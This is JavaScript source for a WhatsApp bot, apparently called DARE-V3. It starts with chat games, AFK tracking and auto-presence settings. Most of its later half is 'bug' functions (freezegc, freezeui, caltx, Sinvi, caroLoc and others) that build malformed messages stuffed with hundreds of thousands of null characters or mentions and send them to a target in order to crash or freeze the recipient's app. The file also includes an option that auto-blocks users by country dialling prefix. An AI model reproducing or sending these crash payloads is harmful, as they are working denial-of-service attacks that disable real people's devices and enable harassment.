	    if (!/^([1-9]|(me)?give up|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room13.game.currentTurn) { 
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room13.game.turn(m.sender === room13.game.playerO, parseInt(m.text) - 1))) {
	    reply({
	    '-3': 'The Game Is Over',
	    '-2': 'Invalid',
	    '-1': 'Invalid Position',
	    0: 'Invalid Position',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room13.game.winner) isWin = true
	    else if (room13.game.board === 511) isTie = true
	    let arr = room13.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room13.game._currentTurn = m.sender === room13.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room13.game.currentTurn : room13.game.winner
	    let str = `room13 ID: ${room13.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game Over` : `Turn ${['❌', '⭕'][1 * room13.game._currentTurn]} (@${room13.game.currentTurn.split('@')[0]})`}
❌: @${room13.game.playerX.split('@')[0]}
⭕: @${room13.game.playerO.split('@')[0]}

Type *surrender* to give up and admit defeat`
	    if ((room13.game._currentTurn ^ isSurrender ? room13.x : room13.o) !== m.chat)
	    room13[room13.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room13.x !== room13.o) await Dare.sendText(room13.x, str, m, { mentions: parseMention(str) } )
	    await Dare.sendText(room13.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room13.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
	    Dare.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    Dare.sendText(m.chat, `Jas has been sent to chat

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

Please select a suit in each chat"
click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) Dare.sendText(roof.p, `Please select \n\nRock🗿\nPaper📄\nScissors✂️`, m)
	    if (!roof.pilih2) Dare.sendText(roof.p2, `Please select \n\nRock🗿\nPaper📄\nScissors✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) Dare.sendText(m.chat, `Both Players Don't Want to Play,\nSuit Canceled`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    Dare.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Don't Choose a Suit, Game Over!`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /Scissors/i
	    let b = /Stone/i
	    let k = /Paper/i
	    let reg = /^(Scissors|Rock|Paper)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\n Waiting for the opponent to choose` : ''}`)
	    if (!roof.pilih2) Dare.sendText(roof.p2, '_Your opponent has chosen\kNow its your turn', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\n Waiting for the opponent to choose` : ''}`)
	    if (!roof.pilih) Dare.sendText(roof.p, '_ Your opponent has chosen\kNow its your turn', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    Dare.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost  \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    } //end
function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  console.log({ms,h,m,s})
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
if (db.users[m.sender].afkTime > -1) {
let user = global.db.users[m.sender]
reply(`
You Quit AFK${user.afkReason ? ' After: ' + user.afkReason : ''}
During ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

	// 🚫 Group Only 🚫
               if (!m.isGroup && !DareTheCreator && db.settings[botNumber].onlygrub) { 
                   if (Command) { 
                       return replydare(`👋 *Hello, buddy!* 🌟\n\n📢 *Group Use Only!* 🛑\n\n⚠️ To avoid spam, this bot is only available in group chats.\n\n🛠️ *Need help?* Contact the owner here: wa.me/${ownernumber}`); 
                   } 
               } 

// 🔒 Private Chat Only 🔒
               if (!DareTheCreator && db.settings[botNumber].onlypc && m.isGroup) { 
                   if (Command) { 
                       return replydare(`👋 *Hey there!* 🌟\n\n💬 *Private Chat Required!* 🚫\n\n⛔ To use this bot, please chat with it in a private chat.\n\nIf you have any issues, don't hesitate to reach out!`); 
                   } 
               } 

		
		// Auto Read
		if (db.settings[botNumber].autoread) {
            Dare.readMessages([m.key]);
        }
        
        // 🔄 Auto Set Bio 🔄
	if (db.settings[botNumber].autobio) {
            Dare.updateProfileStatus(`🚀 ${botname} is Live! 🎉\n\n           🕒 𝙐𝙥𝙩𝙞𝙢𝙚: 𝘙𝘶𝘯𝘯𝘪𝘯𝘨 𝘍𝘰𝘳 ${runtime(process.uptime())} ⏳\n\n                               DARE-V3 ⛩️`).catch(_ => _);
        }

        //auto type
        if (db.settings[botNumber].autotype){
        if (m.message) {
        	let darepos = ['composing']
            Dare.sendPresenceUpdate(darepos, m.chat)
        }
        }
        
        //auto type record
        if (db.settings[botNumber].autorecordtype){
        if (m.message) {
            let daremix = ['composing', 'recording']
            daremix2 = daremix[Math.floor(daremix.length * Math.random())]
            Dare.sendPresenceUpdate(daremix2, m.chat)
        }
        }
        
        //autorecord
        if (db.settings[botNumber].autorecord){
        if (m.message) {
        	let darepos = ['recording']
            Dare.sendPresenceUpdate(darepos, m.chat)
        }
        }
        
        //unavailable
        if (db.settings[botNumber].online) {
        	if (isCmd) {
        	Dare.sendPresenceUpdate('unavailable', m.chat)
        }
        }
        
        // Anti Delete
			if (m.type === 'protocolMessage' && db.settings[m.chat]?.antidelete) {
    const mess = m.message?.protocolMessage;
    if (mess?.type === 0) { // 0 represents "REVOKE" messages
        const chatStore = store.messages?.[m.chat]?.array;

        if (chatStore) {
            const deletedMessage = chatStore.find(a => a.key.id === mess.key.id);
            if (deletedMessage && !deletedMessage.key.participant) { // Ensure it's private chat
                const messageContent = {
                    ...deletedMessage.msg,
                    contextInfo: {
                        isForwarded: true,
                        forwardingScore: 1,
                        quotedMessage: {
                            conversation: '*Anti Delete❗*'
                        }
                    }
                };

                // Relay the message back to the private chat
                await Dare.relayMessage(m.chat, { [deletedMessage.type]: messageContent }, {});
            }
        }
    }
}
//autoblock 212
if (global.autoblockmorroco) {
if (m.sender.startsWith('212')) return Dare.updateBlockStatus(m.sender, 'block')
}

        //download status #ctto
        try {
  const textLower = m.text.toLowerCase();
  if (textLower === 'download' || textLower === 'statusdown' || textLower === 'take' || textLower === 'send') {
    const quotedMessage = m.msg.contextInfo.quotedMessage;
    if (quotedMessage) {
      if (quotedMessage.imageMessage) {
        let imageCaption = quotedMessage.imageMessage.caption;
        let imageUrl = await Dare.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
        Dare.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
        Dare.sendMessage('*Downloading status...*');
      }
      if (quotedMessage.videoMessage) {
        let videoCaption = quotedMessage.videoMessage.caption;
        let videoUrl = await Dare.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
        Dare.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
        Dare.sendMessage('*Downloading status...*');
      }
    }
  }
} catch (error) {
  console.error("Error in 'send message' handling:", error);
}
if (global.autoReact && global.autoReact[m.chat]) {
    const emojis = [
        "😀", "😁", "😂", "🤣", "😃", "😄", "😅", "😆", "😉", "😊",
        "😍", "😘", "😎", "🤩", "🤔", "😏", "😣", "😥", "😮", "🤐",
        "😪", "😫", "😴", "😌", "😛", "😜", "😝", "🤤", "😒", "😓",
        "😔", "😕", "🙃", "🤑", "😲", "😖", "😞", "😟", "😤", "😢",
        "😭", "😨", "😩", "🤯", "😬", "😰", "😱", "🥵", "🥶", "😳",
        "🤪", "😡", "😠", "🤬", "😷", "🤒", "🤕", "🤢", "🤮", "🤧",
        "😇", "🥳", "🤠", "🤡", "🤥", "🤫", "🤭", "🧐", "🤓", "😈",
        "👿", "👹", "👺", "💀", "👻", "👽", "👾", "🤖", "🎃", "😺",
        "😸", "😹", "😻", "😼", "😽", "🙀", "😿", "😾", "💋", "💌",
        "💘", "💝", "💖", "💗", "💓", "💞", "💕", "💟", "💔", "❤️"
    ]; // List of emojis to choose from

    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)]; // Pick a random emoji

    try {
        await Dare.sendMessage(m.chat, {
            react: {
                text: randomEmoji, // Emoji to react with
                key: m.key,        // Message key to react to
            },
        });
    } catch (err) {
        console.error('Error while reacting:', err.message);
    }
}
//autokick 212
if (global.autokickmorroco) {
if (m.isGroup && m.sender.startsWith('212')) return 
}


//antispam kick
if (global.antispam) {
if (m.isGroup && m.message && msgFilter.isFiltered(from)) {
console.log(`${global.themeemoji}[SPAM]`, color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName))
return await Dare.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}
async function sendDareMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await Dare.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

const replydare = (teks) => {
    Dare.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            mentionedJid: [m.sender], // Ensure `m.sender` is defined
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: true,
                containsAutoReply: true,
                title: `${global.botname || "Bot"}`, // Ensure `global.botname` is defined
                body: `${nanoliatwaktu} ${pushname} 👾🤭`, // Ensure variables exist
                previewType: "IMAGE",
                thumbnailUrl: 'https://files.catbox.moe/7rt6v2.jpg',
                sourceUrl: 'https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M'
            }
        }
    }, { quoted: fkontak }); // Ensure `fkontak` is defined
};


async function loading() {
var loadd = [
    "𝒍𝒐𝒂𝒅𝒊𝒏𝒈",
    "𝘋𝘈𝘙𝘌 𝘟 𝘉𝘔𝘉",
    "©𝐃𝐀𝐑𝐄",
    "𝐃𝐀𝐑𝐄-𝐕𝟑"
  ];
let { key } = await Dare.sendMessage(m.chat, {text: '𝒍𝒐𝒂𝒅𝒊𝒏𝒈'})//Pengalih Isu

for (let i = 0; i < loadd.length; i++) {
await Dare.sendMessage(m.chat, {text: loadd[i], edit: key })}
}
const reply = (teks) => {
Dare.sendMessage(from, { text: teks }, { quoted : m})
}
//new bug functions 
const QBug = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net",
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT",
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(
              500000
            )}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
            version: 3,
          },
        },
      },
    };

const TypNul = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net",
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT",
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(
              500000
            )}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
            version: 3,
          },
        },
      },
    };
    
    const qcatalog = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from
          ? {
              remoteJid: "@s.whatsapp.net",
            }
          : {}),
      },
      message: {
        orderMessage: {
          orderId: "594071395007984",
          thumbnail: "https://files.catbox.moe/1h6mh7.jpg",
          itemCount: 9741,
          status: "INQUIRY",
          surface: "CATALOG",
          message: "ZYNXZO -",
          orderTitle: "፝ ⃟!𝙏𝙖𝙢𝙖 𝙍𝙮𝙪𝙘𝙞𝙝𝙞!፝⃟",
          sellerJid: "0@s.whatsapp.net",
          token: "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
          totalAmount1000: "500000000000000",
          totalCurrencyCode: "IDR",
        },
      },
    };
    
    const qdocu = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from
          ? {
              remoteJid: "@s.whatsapp.net",
            }
          : {}),
      },
      message: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
          mimetype: "application/octet-stream",
          fileSha256: "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
          fileLength: "64455",
          pageCount: 1,
          mediaKey: "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
          fileName: "ZYNXZO -" + "ꦾ".repeat(90000),
          fileEncSha256: "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
        },
      },
    };
const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `Hello My Friends`
}}}

const MessageBug = async (X) => {
return Dare.sendMessage(X, {document: fs.readFileSync("./package.json"), mimetype: "😄😇😂🔥", fileName: "Paket.zip", fileLength: 99999999999, caption: `key.com${teksbug2}`}, {quoted: dbug})
}

let ppuser2
try {
ppuser2 = await Dare.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser2 = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}

const qpayment = {
key: {
remoteJid: '0@s.whatsapp.net',
fromMe: false,
id: `ownername`,
participant: '0@s.whatsapp.net'
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: "USD",
amount1000: 999999999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `${botname}`
}},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: "INR"
}}}}

const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363224727390375@newsletter`,
newsletterName: `Hore`,
jpegThumbnail: "",
caption: `© ${global.ownername} 🇳🇬`,
inviteExpiration: Date.now() + 1814400000
}
}}

const qtoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
}, message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "R/jpeg",
"jpegThumbnail": "",
},
"title": `Pterodactyl Server By ${ownername}`,
"description": null,
"currencyCode": "IDR",
"priceAmount1000": "9999999999",
"retailerId": `Powered By bad`,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}}
}
const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }	
        
const qtext = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "0@s.whatsapp.net"} : {}) },'message': {extendedTextMessage: {text: "Thank you for using my services"}}}

const qdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: `Powered By ${ownername}`, jpegThumbnail: ""}}}

const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot JPM By Skzyoo`,jpegThumbnail: ""}}}

const qloc2 = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot Pushkontak By ShyoDes`,jpegThumbnail: ""}}}

const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${ownername}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6285624297893:+62 856-2429-7893\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

////////////////////// FUNCTION BUG ENC FULL POWER //////////////////////
const EsQl = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐃𝐀𝐑𝐄 𝐕𝟑 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"𝐃𝐀𝐑𝐄 𝐕𝟑\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐃𝐀𝐑𝐄 𝐕𝟑 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(350000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
}

     async function caroLoc(target, pic, Ptcp = true ) {
    var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          liveLocationMessage: {
            degreesLatitude: "-999999999999999999999999999",
            degreesLongitude: "-999999999999999999999999999",
            caption: "‌TRY 💔‌" + "@null".repeat(13000),
            sequenceNumber: "0",
            jpegThumbnail: pic
          }
        },
         carouselMessage: "{}"
      }
    }), {
      userJid: target,
      quoted: EsQl
    });
    await Dare.relayMessage(target, etc.message, {
      participant: {
        jid: target
      },
      messageId: etc.key.id
    });
}
  //=======================
 async function Sinvi(target, Ptcp = true) {
     const userMention = {

        "type": "user",

        "userJid": target,

        "mention": "@" + target.split('@')[0], // This assumes the display name is the part before '@'

    };
   let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
     message: {
      interactiveMessage: {
       header: {
        title: "virailix 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲",
        locationMessage: {},
        hasMediaAttachment: true
       },
       body: {
        text: "virailix 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲\n" + userMention.mention.repeat(17000),
       },
       nativeFlowMessage: {
        name: "call_permission_request",
        messageParamsJson: " Spider〽️ "
       },
       carouselMessage: {}
      }
     }
    }
   }), {
    userJid: target,
    quoted: EsQl 
   });

   await Dare.relayMessage(target, etc.message, Ptcp ? {
    participant: {
     jid: target
    }
   } : {});
   console.log(chalk.green("Send Bug 𝐃𝐀𝐑𝐄-𝐕𝟑- 𝐁𝐘 𝐁.𝐌.𝐁 〽️"));
  };   
  async function freezegc(target) {		
		    let etc = generateWAMessageFromContent(
				target,
				proto.Message.fromObject({
		           groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 922.999999999999,
                            degreesLongitude: -9229999999999.999 
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `${buttonkal}.${notif3}.${crash}.${"@0 ".repeat(50000)}`,
           "contextInfo": { mentionedJid: [ "0@s.whatsapp.net" ] }
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: " 𝐃𝐀𝐑𝐄-𝐕𝟑 𝐁𝐘 𝐁.𝐌.𝐁  " }]
                               }
                            }
						}
					},
				}), {
					userJid: target
				}
			);
			await Dare.relayMessage(target, etc.message, {});
		}
const extd = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`,
remoteJid: "status@broadcast" 
},
'message': {
extendedTextMessage: {
text: "𝐃𝐀𝐑𝐄-𝐕𝟑"
}
}
};
async function freezekamoflase(target) {

    await Dare.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 414058.5,
                            degreesLongitude: 131518.0 
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `𝐃𝐀𝐑𝐄-𝐕𝟑 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ ${"@0 ".repeat(50000)}`,
           "contextInfo": { mentionedJid: [ "0@s.whatsapp.net" ] }
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: "𝐑𝐞𝐚𝐥🦣" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function caltx(target) {
			let etc = generateWAMessageFromContent(
				target,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							scheduledCallCreationMessage: {
								scheduledTimestampMs: Date.now(),
								hasMediaAttachment: true,
								text: `${buttonkal}.${notif3}.${crash}.${"@0 ".repeat(50000)}`,
								title: `${buttonkal}.${notif3}.${crash}.${"@0 ".repeat(50000)}`,
								contextInfo: { mentionedJid: [ "0@s.whatsapp.net" ] }
								},
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: "𝐃𝐀𝐑𝐄-𝐕𝟑" }]
							}
						}
					},
				}), {
					userJid: target
				}
			);
			await Dare.relayMessage(target, etc.message, {});
		}
		
async function freezeuii(target) {

    await Dare.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 922.999999999999,
                            degreesLongitude: -9229999999999.999 
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `${buttonkal}.${notif3}.${crash}.${"@0 ".repeat(50000)}`,
           "contextInfo": { mentionedJid: [ "0@s.whatsapp.net" ] }
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: " 𝐃𝐀𝐑𝐄-𝐕𝟑 " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function freezeui(target) {

    await Dare.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        viewOnceMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0 
                        },
                        hasMediaAttachment: false
                    },
                    body: {
                        text: `𝐃𝐀𝐑𝐄-𝐕𝟑 ${"@2348089405509 ".repeat(10000)}`,
           "contextInfo": { mentionedJid: [ "2348089405509@s.whatsapp.net" ] }
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "2348089405509@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: " 𝐃𝐀𝐑𝐄-𝐕𝟑 " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function NewsletterZap(target) {
			var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
				'viewOnceMessage': {
				   'key': {
                    'remoteJid': 'status@broadcast',
                     'fromMe': false,
                      'participant': '0@s.whatsapp.net'
                },
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363298524333143@newsletter`,
							"newsletterName": `${buttonkal}`,
							"jpegThumbnail": "",
							"caption": `𝐃𝐀𝐑𝐄-𝐕𝟑🐉`,
							"inviteExpiration": Date.now() + 1814400000
						}
					}
				}
			}), {
				'userJid': target
			});
			await Dare.relayMessage(target, messageContent.message, {
